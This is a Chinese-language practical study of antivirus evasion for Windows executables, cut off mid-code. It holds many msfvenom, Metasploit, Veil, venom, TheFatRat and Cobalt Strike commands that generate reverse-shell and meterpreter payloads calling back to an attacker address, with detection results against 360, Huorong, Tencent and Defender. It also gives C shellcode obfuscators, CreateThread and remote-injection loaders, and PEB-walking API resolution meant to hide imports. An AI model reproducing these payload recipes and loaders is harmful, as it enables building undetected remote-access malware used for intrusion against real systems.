# PE免杀实战研究

## 0x00 免杀技术现状研究

### 1 免杀制作视角

#### 1.1 免杀目标

任何可用于攻击或破坏的实体都需要免杀，且免杀与查杀是动态对抗的。实际上，程序的实际形态与结构比较复杂，因此不同形态类型的程序使用的免杀技术是存在一定区别的。



#### 1.2 流行免杀工具

| 名称                 | 国内流行度 | 专用免杀工具 |
| -------------------- | ---------- | ------------ |
| msfvenom             | 非常高     | 否           |
| cobalt_strike        | 非常高     | 否           |
| veil                 | 高         | 是           |
| msf-vasion           | 高         | 是           |
| venom                | 高         | 是           |
| The Backdoor Factory | 一般       | 是           |
| thefatrat            | 一般       | 是           |
| zirkatu              | 低         | 是           |
| avlator              | 低         | 是           |
| nps_payload          | 低         | 是           |
| donout               | 低         | 是           |



#### 1.3 对象形态

##### 1.3.1 独立文件

以远控为例，独立的远控指程序自身就是完全独立可用的远控程序，内部实现了完备的功能。远控中有时提到的stagless/single类远控也就是独立远控。

典型工具：**Metasploit**、**ColbaltStrike**。**灰鸽子**、**冰河**、**上兴**



##### 1.3.2 加载器

以远控为例，以msf/cs工具的漏洞利用过程来说，目标设备上运行加载器(stager)，加载器从C2服务器上再动态加载（payload-staging）完整的功能模块(stage)。

典型工具：**Metasploit**、**ColbaltStrike**

```shell
stager：是一段很精短的代码，本质是个加载器，它可以向C2服务器发起连接，并下载真正的payload并将其注入内存。(bind_tcp/reverse_tcp)

stage：是一个包含了很多功能的代码块，用于接受和执行我们控制端的任务并返回结果。(meterpreter/shell)

payload Staging：stager通过各种方式(如http、dns、tcp等)下载stage并注入内存运行这个过程。

https://www.anquanke.com/post/id/231002
https://my.oschina.net/u/4581876/blog/4380681
所谓的beacon与stage(r)类似，是远控在受害者的驻点。
```



##### 1.3.3 文件篡改

不少程序内部存在大量的空闲空间，这些空间闲散在各个节区内，某些研究人员发现可以在这些空余间隙中填充payload并篡改程序的执行流程，从而达到植入后门的目的。

典型工具：**The Backdoor Factory**



##### 1.3.4 dll注入/劫持

通过劫持正常的程序对依赖的dll的加载，从而劫持程序的执行流程达到执行恶意代码恶意功能的目的。

典型工具：**Metasploit**、**ColbaltStrike**、**venom**、**APT白加黑**



##### 1.3.5 无文件执行

以powershell和bashshell为代表，通过命令动态向C2服务器请求代码并执行或反弹一个shell。

典型工具：**Empire**、**Nishang**



### 2 杀软检测视角

#### 2.1 恶意文件检测技术

常规的安全软件对恶意程序的识别与查杀主要有以下手段：

##### 2.1.1 特征码扫描技术

计算文件的特征与数据库内的特征进行比对。误报率低，适用于已知病毒。



##### 2.1.2 校验和扫描技术

计算文件的哈希校验和与数据库内进行比对。误报率低，适用于已知病毒，但很容易被绕过。



##### 2.1.3 虚拟行为分析

通过将文件放置到杀毒软件创建的虚拟环境中进行运行，观察其对资源的申请动作，进而识别程序是否恶意。



##### 2.1.4 启发式引擎查杀

在提取并获得程序的静态特征及行为的基础上，结合学习经验，推断出目标是否是恶意文件。



##### 2.1.5 主动防御

主动防御分为两大块。

\- **行为监控**：通过hook 系统底层API，进而识别进程对资源的申请动作。

\- **内存查杀**：分析内存中程序的结构。



##### 2.1.6 云查杀

主要是解决本地杀毒软件无法存储所有恶意文件的静态特征的问题，将本地文件的特征值计算出来与云端进行比对。



##### 2.1.7 多引擎查杀

结合多家杀毒软件的引擎对文件进行查杀，进而降低误报率。



##### 2.1.8 人工智能引擎

通过人工智能分析的算法，结合海量数据，从而学习新形式恶意软件查杀的能力。



#### 2.2 杀毒软件

由于要做的免杀主要用于国内，因此与国内杀软的对抗，处于最高的优先级。结合国内杀软的普及占有率，大概给出以下梯队结构：

**优先级1：**360全家桶、Windows Defender、火绒、奇安信

**优先级2：**瑞星、诺顿、金山、小红伞、腾讯安全管家

**优先级3：**江民、比特梵德、迈克菲、大蜘蛛、avast等。



### 3 免杀技术

这里以最为常见的独立远控与加载类远控为例，介绍免杀一个文件的几个大的步骤。

#### 3.1 第一阶段-文件免杀/静态免杀

文件免杀是免杀的第一阶段，杀毒软件最常见的对恶意样本的识别就是检测文件特征码。文件免杀即是规避掉这些特征，规避方法有很多，下面给出几种常见的免杀方式。

+ 1.**特征码定位修改免杀**：破坏特征，影响模糊哈希结果。（比较适合无源码情况下免杀，不同厂商特征码确定方法不一，故免杀代价高）
+ 2.**加壳免杀**：核心程序外套一层加密壳，壳有自己的程序入口，运行后解密出核心程序并执行。壳掩盖了内部可能存在的特征值，但壳自己也有特征，且有可能被查杀软件与分析人员脱掉。（TideSec的文章中提到可以修改冷门壳的程序实现绕过。）
+ 3.**花指令免杀**：填充垃圾数据或无意义指令阻止反汇编分析或影响特征码定位。
+ 4.**shellcode的混淆/分离**：以msf、cs为代表漏洞利用框架，stager中常用的shellcode已被杀毒软件重点关照，因此可以将他们进行混淆处理，在运行时进行重组。
+ 5.**分离免杀**：以msf、cs为代表漏洞利用框架，stager中常用的shellcode已被杀毒软件重点关照。可以将payload-staging时的shellcode与程序shellcode加载器进行分离。加载器+加密或编码后的payload，进而躲掉模糊哈希比对。



#### 3.2 第二阶段-反行为检测/运行时免杀1

+ 欺骗沙箱

+ 识别并躲避沙箱

主要是规避掉文件运行时会表现出来的行为特征（如联网、读写敏感文件、获取敏感资源）。

在对抗行为检测的过程中，又会引入一部分静态特征，因此需要不断的综合调整。下面引用一篇文章中对行为检测对抗的简要介绍。

```cmd
# https://github.com/Airboi/bypass-av-note
对行为来讲，很多API可能会触发杀软的监控，比如注册表操作、添加启动项、添加服务、添加用户、注入、劫持、创建进程、加载DLL等等。 针对行为的免杀，我们可以使用白名单、替换API、替换操作方式（如使用WMI/COM的方法操作文件）等等方法实现绕过。除常规的替换、使用未导出的API等姿势外，我们还可以使用通过直接系统调用的方式实现，比如使用内核层面Zw系列的API，绕过杀软对应用层的监控（如下图所示，使用ZwAllocateVirtualMemory函数替代VirtualAlloc）。
```



#### 3.3 第三阶段 内存免杀/运行时免杀2

杀毒软件沙箱中扫描运行起来的恶意程序，扫描起内存地址上的内容是否能匹配到已知的病毒库特征值。

从目前的实际工具免杀来看，往往只要过了文件免杀与行为检测免杀就能实现彻底免杀。然而不少杀毒软件还有内存查杀，内存查杀针对已知的恶意文件查杀效果较好。想要躲避内存查杀，需要破坏程序加载到内存后的特征，因此往往需要结合源码进行修改。



#### 3.4 其他-非常规免杀

+ 1 **白名单免杀**：杀毒软件有白名单，白化可以从以下角度考虑（图片、版本信息、对话框）、泄露的可信的私钥签名
+ 2 **dll劫持免杀**：优先级劫持或替换正常位置的dll达到白加黑绕过。
+ 3 **篡改免杀**：以BDF为代表的后门制作工具利用正常程序中的无用空间填充shellcode，篡改正常执行流程达到后门制作的效果。
+ 4 **切换开发语言**：杀毒软件对不同语言开发出来的远控识别能力是存在差异的，主流的漏洞利用框架下，基于C/C++、C#、py、powershell的样本识别率往往很高，而go语言的识别率就较低。



## 0x01 免杀测试

针对一些主流的常见的漏洞利用框架及免杀制作工具，简单进行了测试。结果如下。

| 工具            |             | 生成             |      |      |                                                              |
| --------------- | ----------- | ---------------- | ---- | ---- | ------------------------------------------------------------ |
| 360杀毒联网     | 360卫士联网 | 腾讯安全（联网） | 火绒 |      |                                                              |
| msfvenom        | √           | √                | √    | √    | msfvenom -p  windows/meterpreter/reverse_tcp LHOST=192.168.43.128 LPORT=51001 -f exe -o  51001.exe |
| msfconsole      | √           | √                | ×    | √    | msfconsole -x "use  windows/windows_defender_exe;\set filename 51002.exe;\set payload  windows/meterpreter/reverse_tcp;\set LHOST 192.168.43.128;\set LPORT  51002;\run;\exit" |
| msfconsole      | ×           | ×                | √    | ×    | msfconsole -x "use  windows/windows_defender_js_hta;\set filename 51003.hta;\set payload  windows/meterpreter/reverse_tcp;\set LHOST 192.168.43.128;\set LPORT  51003;\run;\exit" |
| veil            | √           | √                | √    | √    | docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use autoit/shellcode_inject/flat.py     generate     Ordnance     use 4     set LHOST 192.168.43.128     set LPORT 51004     generate     51004          exit |
| veil            | ×           | ×                | ×    | √    | docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use c/meterpreter/rev_tcp.py     set LHOST 192.168.43.128     set LPORT 51005     generate     51005          exit |
| veil            | √           | √                | ×    | √    | docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use cs/meterpreter/rev_tcp.py     set LHOST 192.168.43.128     set LPORT 51006     generate     51006          exit |
| veil            | ×           | ×                | ×    | √    | docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use cs/shellcode_inject/base64.py     generate     1     use 4     set LHOST 192.168.43.128     set LPORT 51007     generate     51007          exit |
| veil            | ×           | ×                | ×    | √    | docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use cs/shellcode_inject/virtual.py     generate     1     use 4     set LHOST 192.168.43.128     set LPORT 51008     generate     51008          exit |
| veil            | √           | √                | √    | √    | docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use go/meterpreter/rev_tcp.py     set LHOST 192.168.43.128     set LPORT 51009     generate     51009          exit |
| veil            | √           | √                | ×    | √    | docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use go/shellcode_inject/virtual.py     generate     1     use 4     set LHOST 192.168.43.128     set LPORT 51010     generate     51010          exit |
| veil            | √           | √                | √    | √    | docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use powershell/meterpreter/rev_tcp.py     set LHOST 192.168.43.128     set LPORT 51011     generate     51011          exit |
| veil            | ?           | ?                | ?    | ?    | docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use powershell/shellcode_inject/psexec_virtual.py     generate     1     use 4     set LHOST 192.168.43.128     set LPORT 51012     generate     51012          exit |
| veil            | √           | √                | √    | √    | docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use powershell/shellcode_inject/virtual.py     generate     1     use 4     set LHOST 192.168.43.128     set LPORT 51013     generate     51013          exit |
| msfvenom        | √           | √                | √    | √    | msfvenom -p  windows/meterpreter/reverse_tcp LHOST=192.168.43.128 LPORT=51014 -f exe -i 5  -e x86/shikata_ga_nai -o 51014.exe |
| msfvenom        | ×           | ×                | ×    | ×    | msfvenom -p  windows/meterpreter/reverse_tcp LHOST=192.168.43.128 LPORT=51015 -f exe -i 5  -e x86/shikata_ga_nai \|msfvenom -a x86 --platform windows -e x86/countdown -i  8 -f raw -o 51015.exe |
| msfvenom        | √           | √                | √    | √    | msfvenom -p  windows/meterpreter/reverse_tcp LHOST=192.168.43.128 LPORT=51016 -f exe -i 10  -b "\x00" -e x86/shikata_ga_nai -o 51016.exe |
| veil            | √           | √                | √    | √    | docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use autoit/shellcode_inject/flat.py     generate     Ordnance     use 4     set LHOST 192.168.43.128     set LPORT 51017     set Encoder xor     generate     51017          exit |
| veil            | √           | √                | √    | √    | docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use go/shellcode_inject/virtual.py     generate     1     use 4     set LHOST 192.168.43.128     set LPORT 51018     set encoder xor     generate     51018          exit |
| veil            | ×           | ×                | ×    | √    | docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use cs/shellcode_inject/virtual.py     generate     1     use 4     set LHOST 192.168.43.128     set LPORT 51019     set encoder xor     generate     51019          exit |
| msfconsole      | ×           | ×                | ×    | ×    | msfconsole -x "use  windows/applocker_evasion_install_util;\set payload  windows/meterpreter/reverse_tcp;\set lhost 192.168.43.128;\set lport  51020;\set filename 51020.txt;\run;\exit" |
| msfconsole      | ×           | ×                | ×    | ×    | msfconsole -x "use  evasion/windows/applocker_evasion_workflow_compiler;\set payload  windows/meterpreter/reverse_tcp;\set lhost 192.168.43.128;\set lport  51021;\set XML_FILE 51021.xml;\set XOML_FILE 51021.xoml;\run;\exit" |
| msfconsole      | ×           | ×                | ×    | √    | msfconsole -x "use  evasion/windows/applocker_evasion_msbuild;\set payload  windows/meterpreter/reverse_tcp;\set lhost 192.168.43.128;\set lport  51022;\set filename 51022.txt;\run;\exit" |
| msfconsole      | ×           | √                | ×    | ×    | msfconsole -x "use  evasion/windows/applocker_evasion_presentationhost;\set payload  windows/meterpreter/reverse_tcp;\set lhost 192.168.43.128;\set lport  51023;\set CSPROJ_FILE 51023.csproj;\set CS_FILE 51023.xaml.cs;\set  MANIFEST_FILE 51023.manifest;\run;\exit" |
| msfconsole      | ×           | ×                | ×    | ×    | msfconsole -x "use  evasion/windows/applocker_evasion_regasm_regsvcs;\set payload  windows/meterpreter/reverse_tcp;\set lhost 192.168.43.128;\set lport  51024;\set SNK_FILE 51024.snk;\set TXT_FILE 51024.txt;\run;\exit" |
| msfvenom        | ×           | √                | ×    | √    | msfvenom -p  windows/meterpreter/reverse_tcp LHOST=192.168.43.128 LPORT=51025 -f exe -x  csc-v4.0.30319x86.exe -o 51025.exe |
| msfvenom        | ×           | √                | ×    | √    | msfvenom -p  windows/meterpreter/reverse_tcp LHOST=192.168.43.128 LPORT=51026 -f exe -x  csc-v4.0.30319x86.exe -i 10 -b "\x00" -e x86/shikata_ga_nai -o  51026.exe |
| msfconsole      | ×           | √                | ×    | ×    | msfconsole -x "use  evasion/windows/process_herpaderping;\set payload  windows/meterpreter/reverse_tcp;\set lhost 192.168.43.128;\set lport  51027;\set filename 51027.exe;\run;\exit" |
| venom           | ×           | √                | ×    | √    | 2     4     192.168.43.128     51028     windows/meterpreter/reverse_tcp     51028     None-Obfuscation |
| venom           | ×           | ×                | ×    | √    | 2     4     192.168.43.128     51029     windows/meterpreter/reverse_tcp     51029     String Obfuscation（3 s） |
| venom           | ×           | √                | ×    | √    | 2     4     192.168.43.128     51030     windows/shell/reverse_tcp     51030     None-Obfuscation |
| venom           | ×           | √                | ×    | √    | 2     4     192.168.43.128     51031     windows/shell/reverse_tcp     51031     String Obfuscation（3 s） |
| venom           | √           | √                | ×    | ×    | 2     5     192.168.43.128     51032     windows/meterpreter/reverse_tcp     51032 |
| venom           | √           | √                | ×    | ×    | 2     5     192.168.43.128     51033     windows/shell/reverse_tcp     51033 |
| venom           | ×           | ×                | ×    | ×    | 2     3     192.168.43.128     51034     windows/shell/reverse_tcp     51034     default(shellcode.py)python |
| venom           | ×           | ×                | ×    | ×    | 2     3     192.168.43.128     51035     windows/shell/reverse_tcp     51035     pyherion(shellcode.py)obfuscated |
| venom           | ×           | ×                | ×    | ×    | 2     3     192.168.43.128     51036     windows/shell/reverse_tcp     51036     NXcrypt(shellcode.py)obfuscated |
| venom           | ×           | ×                | ×    | ×    | 2     3     192.168.43.128     51037     windows/shell/reverse_tcp     51037     pyinstaller(shellcode.exe)executable |
| venom           | ×           | ×                | ×    | ×    | 2     3     192.168.43.128     51038     windows/meterpreter/reverse_tcp     51038     default(shellcode.py)python |
| venom           | ×           | ×                | ×    | ×    | 2     3     192.168.43.128     51039     windows/meterpreter/reverse_tcp     51039     pyherion(shellcode.py)obfuscated |
| venom           | ×           | ×                | ×    | ×    | 2     3     192.168.43.128     51040     windows/meterpreter/reverse_tcp     51040     NXcrypt(shellcode.py)obfuscated |
| venom           | ×           | ×                | ×    | ×    | 2     3     192.168.43.128     51041     windows/meterpreter/reverse_tcp     51041     pyinstaller(shellcode.exe)executable |
| venom           | √           | √                | √    | √    | 2     15     192.168.43.128     51042     windows/meterpreter/reverse_tcp     51042 |
| venom           | √           | √                | √    | √    | 2     15     192.168.43.128     51043     windows/shell/reverse_tcp     51043 |
| venom           | -           | -                | -    | -    | 2     16     192.168.43.128     51044     windows/meterpreter/reverse_https     51044 |
| venom           | -           | -                | -    | -    | 2     16     192.168.43.128     51045     windows/meterpreter/reverse_winhttps     51045 |
| venom           | -           | -                | -    | -    | 2     17     192.168.43.128     51046     3     windows/meterpreter/reverse_http     51046 |
| venom           | -           | -                | -    | -    | 2     18     The full path of your agent.exe     192.168.43.128     51047     windows/shell/reverse_tcp |
| venom           | ×           | ×                | ×    | ×    | 2     18     The full path of your csc-v4.0.30319x86.exe     192.168.43.128     51048     windows/meterpreter/reverse_tcp |
| venom           | -           | -                | -    | √    | 2     19     192.168.43.128     51049     windows/meterpreter/reverse_tcp |
| venom           | -           | -                | -    | √    | 2     19     192.168.43.128     51050     windows/meterpreter/reverse_winhttps |
| venom           | -           | -                | -    | -    | venom-20                                                     |
| cobaltstrike    | √           | √                | √    | √    | ColbaltStrike>Listeners>Add>"windows/beacon_http/reverse_http;Port  51052"     Attacks>Packages>Windows Execuation>Windows EXE |
| cobaltstrike    | √           | √                | √    | √    | ColbaltStrike>Listeners>Add>"windows/beacon_https/reverse_https;Port  51053"     Attacks>Packages>Windows Execuation>Windows EXE |
| cobaltstrike    | √           | √                | √    | √    | ColbaltStrike>Listeners>Add>"windows/beacon_http/reverse_http;Port  51054"     Attacks>Packages>Windows Execuation(stageless)>Windows EXE |
| cobaltstrike    | √           | √                | √    | √    | ColbaltStrike>Listeners>Add>"windows/beacon_https/reverse_https;Port  51055"     Attacks>Packages>Windows Execuation(stageless)>Windows EXE |
| cobaltstrike    | √           | √                | √    | √    | ColbaltStrike>Listeners>Add>"windows/beacon_http/reverse_http;Port  51056"     Attacks>Packages>Windows Execuation>Windows Service EXE |
| cobaltstrike    | √           | √                | √    | √    | ColbaltStrike>Listeners>Add>"windows/beacon_https/reverse_https;Port  51057"     Attacks>Packages>Windows Execuation>Windows Service EXE |
| cobaltstrike    | √           | √                | √    | √    | ColbaltStrike>Listeners>Add>"windows/beacon_http/reverse_http;Port  51058"     Attacks>Packages>Windows Execuation(stageless)>Windows Service EXE |
| cobaltstrike    | √           | √                | √    | √    | ColbaltStrike>Listeners>Add>"windows/beacon_https/reverse_https;Port  51059"     Attacks>Packages>Windows Execuation(stageless)>Windows Service EXE |
| cobaltstrike    | ×           | ×                | ×    | √    | ColbaltStrike>Listeners>Add>"windows/beacon_http/reverse_http;Port  51060"     Attacks>Packages>Windows Execuation(stageless)>powershell |
| cobaltstrike    | ×           | ×                | ×    | √    | ColbaltStrike>Listeners>Add>"windows/beacon_https/reverse_https;Port  51061"     Attacks>Packages>Windows Execuation(stageless)>powershell |
| backdoorfactory | √           | √                | ×    | ×    | ./backdoor.py -f  workspace/calc.exe -s cave_miner_inline -J -H 192.168.43.128 -P 51062 -o 51062.exe     9     10     11 |
| theFatRat       | ×           | ×                | ×    | ×    | proxychains ./fatrat               2     [ 1 ] - Powerstager 0.2.5 by z0noxz (powershell) (NEW)     192.168.43.128     51063     51063     2     access.ico |
| theFatRat       | √           | ×                | ×    | ×    | proxychains ./fatrat               2     [ 2 ] - slow but useful     192.168.43.128     51064     51064     2 |
| theFatRat       | ×           | ×                | √    | √    | proxychains ./fatrat          6     1     192.168.43.128     51065     51065     2 windows/shell/reverse_tcp |
| theFatRat       | ×           | ×                | √    | √    | proxychains ./fatrat          6     1     192.168.43.128     51066     51066     3 windows/meterpreter/reverse_tcp |
| theFatRat       | ×           | ×                | ×    | √    | proxychains ./fatrat          6     2     192.168.43.128     51067     51067     2 windows/shell/reverse_tcp |
| theFatRat       | ×           | ×                | ×    | √    | proxychains ./fatrat          6     2     192.168.43.128     51068     51068     3 windows/meterpreter/reverse_tcp |
| theFatRat       | ×           | ×                | ×    | √    | proxychains ./fatrat          6     3     192.168.43.128     51069     51069     6 windows/meterpreter/reverse_https |
| theFatRat       | ×           | ×                | ×    | √    | proxychains ./fatrat          6     4     192.168.43.128     51070     51070     3 windows/meterpreter/reverse_tcp |
| theFatRat       | √           | √                | √    | √    | proxychains ./fatrat          6     5     192.168.43.128     51071     51071     2 windows/shell/reverse_tcp |
| theFatRat       | ×           | ×                | ×    | ×    | proxychains ./fatrat          6     7     192.168.43.128     51072     51072     #2 windows/shell/reverse_tcp |



## 0x02 定制与开发

下面给出一些在实战shellcode加载类免杀中用到的一些免杀tips。这里不会给出具体的代码，而是给出一些模块的实现思想，将这些模块进行简单组合就能达到不错的免杀效果。而这些模块的开发与实现成本非常低。



### 1 文件免杀

#### 1.1 shellcode混淆器

shellcode混淆器用于“源码编译类的小远控”场景下中掩盖stager内shellcode的静态特征。

shellcode混淆器的开发成本非常低，可以采用自定义的编码算法对原有shellcode进行混淆，进而掩盖原生shellcode内的静态特征。

- 下面给出一个简单的异或混淆器demo。

```c
#混淆器
void x(unsigned char* raw_buf, unsigned int size) {
    for (int i = 0; i < (size - 1); i++) {
        ......
        raw_buf[i] = raw_buf[i] ^ raw_buf[j] + (unsigned char)size;
    }
}

#解混淆器
void y(unsigned char* raw_buf, unsigned int size) {
    for (int i = size - 2; i >= 0; i--) {
        ......
        raw_buf[i] = raw_buf[i] ^ raw_buf[j] + (unsigned char)size;
    }
}
```

#### 1.2 加载器

“源码编译类的小远控”场景下加载器的实现方式非常多，目前收集了一些C语言下的常见加载器。可以简单将他们分成以下3类：

##### 1.2.1 函数指针加载器

###### # 函数指针型加载器

下面是一个最简单的C语言函数指针型加载器。

```c
void func_p01nt3r_1() {
    void (*func)();
    func = (void (*)()) (void*)raw_buf;
    (void)(*func)();
}
```



##### 1.2.2 线程创建类加载器

此类加载器基本遵循以下流程：

**step 1.**shellcode复制到申请的内存页上。

**step 2.**设置内存页的权限位上加上可执行权限。

**step 3 .**使用线程创建类函数直接执行该内存块上的内容。

###### # CreateThread加载器-1

```c
void cr34te_thr34d_1() {
    //#include <windows.h>
#include <string.h>
    LPVOID lpvAddr = (LPVOID)malloc(1024);
    memset(lpvAddr, '\x00', 1024);
    memcpy(lpvAddr, raw_buf, sizeof(raw_buf));
    DWORD pa = 0x01;
    VirtualProtect(lpvAddr, sizeof(raw_buf), PAGE_EXECUTE_READWRITE, &pa);//PAGE_EXECUTE
    if (lpvAddr != NULL) {
        HANDLE s;
        s = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)lpvAddr, raw_buf, 0, 0);
        WaitForSingleObject(s, INFINITE);
    }
}
```

###### # CreateThread加载器-2

```c
void cr34te_thr34d_2() {
    //#include <windows.h>
    LPVOID lpvAddr = VirtualAlloc(0, 1024, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    RtlMoveMemory(lpvAddr, raw_buf, sizeof(raw_buf));
    DWORD pa = 0x01;
    VirtualProtect(lpvAddr, sizeof(raw_buf), 0x10, &pa);
    if (lpvAddr != NULL) {
        HANDLE s;
        s = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)lpvAddr, raw_buf, 0, 0);
        WaitForSingleObject(s, INFINITE);
    }
}
```

###### # CreateThread加载器-3

```C
void cr34te_thr34d_3() {
    HANDLE heap;
    heap = (int*)HeapCreate(0, 0x00, 0xfff);

    LPVOID lpvAddr;
    lpvAddr = (LPVOID)HeapAlloc(heap, 0, 1024);
    memset(lpvAddr, '\x00', 1024);
    memcpy(lpvAddr, raw_buf, sizeof(raw_buf));
    DWORD pa = 0x01;
    VirtualProtect(lpvAddr, sizeof(raw_buf), PAGE_EXECUTE_READWRITE, &pa);//PAGE_EXECUTE
    if (lpvAddr != NULL) {
        HANDLE s;
        s = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)lpvAddr, raw_buf, 0, 0);
        WaitForSingleObject(s, INFINITE);
    }

}
```

###### # CreateThread加载器-4

```C
void cr34te_thr34d_4() {
    //#include <windows.h>
    LPVOID lpvAddr = VirtualAllocExNuma(GetCurrentProcess(), NULL, 1024, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);
    RtlMoveMemory(lpvAddr, raw_buf, sizeof(raw_buf));
    DWORD pa = 0x01;
    VirtualProtect(lpvAddr, sizeof(raw_buf), 0x10, &pa);
    if (lpvAddr != NULL) {
        HANDLE s;
        s = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)lpvAddr, raw_buf, 0, 0);
        WaitForSingleObject(s, INFINITE);
    }
}
```

除了上面使用的CreateThread函数以外，理论上还有很多其他替代的函数。如"\_beginThreadex","pthread_create"。由于没有具体测试过，就不附进来了。不同函数的组合能一定程度上对代码静态分析产生干扰达到简单的绕过。



##### 1.2.3 线程劫持类加载器

###### # VirtualAllocEx加载器-1

```C
void thr34d_h1j4ck1ng_1() {
    // visual studio 2019
    SIZE_T size = 0;
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;

    ZeroMemory(&si, sizeof(si));
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;

    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);

    BOOL success = CreateProcessA(
        NULL,
        (LPSTR)"C:\\Windows\\System32\\cmd.exe",
        NULL,
        NULL,
        true,
        CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,//有扩展启动信息的结构体
        NULL,
        NULL,
        reinterpret_cast<LPSTARTUPINFOA>(&si),
        &pi);

    HANDLE notepadHandle = pi.hProcess;
    LPVOID remoteBuffer = VirtualAllocEx(notepadHandle, NULL, sizeof raw_buf, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

    WriteProcessMemory(notepadHandle, remoteBuffer, raw_buf, sizeof raw_buf, NULL);
    HANDLE remoteThread = CreateRemoteThread(notepadHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);

    if (WaitForSingleObject(remoteThread, INFINITE) == WAIT_FAILED) {
        return;
    }

    if (ResumeThread(pi.hThread) == -1) {
        return;
    }
}
```

###### # VirtualAllocEx加载器-2

```C
void thr34d_h1j4ck1ng_2() {
    HANDLE p = NULL;
    LPVOID lpvAddr = VirtualAllocEx(GetCurrentProcess(), 0, 1024, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    RtlMoveMemory(lpvAddr, raw_buf, sizeof(raw_buf));
    DWORD pa = 0x01;
    VirtualProtect(lpvAddr, sizeof(raw_buf), 0x10, &pa);
    if (lpvAddr != NULL) {
        HANDLE s;
        s = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)lpvAddr, raw_buf, 0, 0);
        WaitForSingleObject(s, INFINITE);
    }
}
```

##### 1.2.4 动态函数寻址加载器

不论PE文件还是ELF文件都有导入表的说法，导入表内的内容与程序内使用的各种外部API函数息息相关。因而，不少杀毒软件也通过分析导入表来判断程序是否存在潜在的恶意特征。也介于这样原因，演化一种更高级的写法，能够降低导入表内出现的函数。

###### # 动态函数寻址加载器-1

```c
void cr34te_thr34d_dynamic_1() {
    //#include <windows.h>
#include <string.h>
    LPVOID lpvAddr = (LPVOID)malloc(1024);
    memset(lpvAddr, '\x00', 1024);
    memcpy(lpvAddr, raw_buf, sizeof(raw_buf));
    DWORD pa = 0x01;
	LPVOID mVirtualProtect = GetProcAddress(LoadLibraryA("kernel32.dll"), "VirtualAlloc");
    mVirtualProtect(lpvAddr, sizeof(raw_buf), PAGE_EXECUTE_READWRITE, &pa);//PAGE_EXECUTE
    if (lpvAddr != NULL) {
        HANDLE s;
        s = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)lpvAddr, raw_buf, 0, 0);
        WaitForSingleObject(s, INFINITE);
    }
}
```

###### # 动态函数寻址加载器-2

不少加壳软件中大量用到了本技术，这种技术可以彻底脱离对外部API函数的导入需求，完全通过内部寻址实现。

```C
__declspec(naked) PDWORD GerKernelBase()
{
	__asm
	{
		mov eax, fs: [0x30] ;
		mov eax, [eax + 0x0c];
		mov eax, [eax + 0x14];
		mov eax, [eax];
		mov eax, [eax];
		mov eax, [eax + 0x10];
		ret
	}
}

DWORD GetFunAddr(DWORD* DllBase, char* FunName)
{
	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)DllBase;
	PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos->e_lfanew + (DWORD)pDos);
	PIMAGE_OPTIONAL_HEADER pOt = (PIMAGE_OPTIONAL_HEADER)&pNt->OptionalHeader;
	PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pOt->DataDirectory[0].VirtualAddress + (DWORD)DllBase);

	PDWORD pNameAddr = (PDWORD)(pExport->AddressOfNames + (DWORD)DllBase);
	PWORD pNameOrdAddr = (PWORD)(pExport->AddressOfNameOrdinals + (DWORD)DllBase);
	PDWORD pFunAddr = (PDWORD)(pExport->AddressOfFunctions + (DWORD)DllBase);
	for (int i = 0; i < pExport->NumberOfNames; i++)
	{
		char* Name = (char*)(pNameAddr[i] + (DWORD)DllBase);
		if (!strcmp(Name, FunName))
		{
			WORD NameOrdinal = pNameOrdAddr[i];
			return pFunAddr[NameOrdinal] + (DWORD)DllBase;
		}
	}
}

/*获取指定函数地址*/
FARPROC GetApi(char* LibraryName, char* FuncName)
{
	PDWORD KernerBase = GerKernelBase();
	M_GetProcAddress MyGetProcess = (M_GetProcAddress)GetFunAddr(KernerBase, "GetProcAddress");
	M_LoadLibraryA MyLoadLibraryA = (M_LoadLibraryA)GetFunAddr(KernerBase, "LoadLibraryA");
	return MyGetProcess(MyLoadLibraryA(LibraryName), FuncName);
}

void cr34te_thr34d_dynamic_2() {
    //#include <windows.h>
#include <string.h>
    LPVOID lpvAddr = (LPVOID)malloc(1024);
    memset(lpvAddr, '\x00', 1024);
